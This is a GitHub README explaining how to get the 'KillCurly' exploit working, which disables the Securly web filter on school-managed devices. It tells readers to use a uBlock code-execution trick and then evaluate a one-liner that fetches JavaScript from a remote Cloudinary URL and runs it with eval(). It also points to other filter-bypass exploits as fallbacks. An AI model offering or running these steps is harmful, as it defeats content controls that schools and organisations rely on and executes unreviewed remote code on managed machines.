HEAD
Note: You should NOT open an issue with @zek-c, he will get mad if you don't put something simple (as proven [here](https://github.com/zek-c/Securly-Kill-V111/issues/38)).

# KillCurly Working
@zek-c's KillCurly exploit, but working.

### Feel free to follow the instructions below:

From [3kh0](https://3kh0.github.io/ext-remover/)'s `ext-remover` thingy (in the case that uBlock isn't blocked as an installable extension), I found a way to make the KillCurly exploit work 🎉

Essentially, you would follow the instructions [here](https://3kh0.github.io/ext-remover/#ublock-run-run-code-on-pages).

Once you have that done, you would press `ctrl`**+**`alt`**+**`~` until you see the `Eval: ` alert. 

Then you would evaluate:

``` javascript
fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))
```

Since this is JavaScript evaluation only, you wouldn't put the `javascript:` like you would in a bookmarklet.

I recommend going to [Securly](https://www.securly.com) to do all of this because that's where the kill script is meant to work.

If this doesn't work, you would use Bypassi's INSECURLY exploit or Skiovox.

I hope you guys enjoy this 🫰
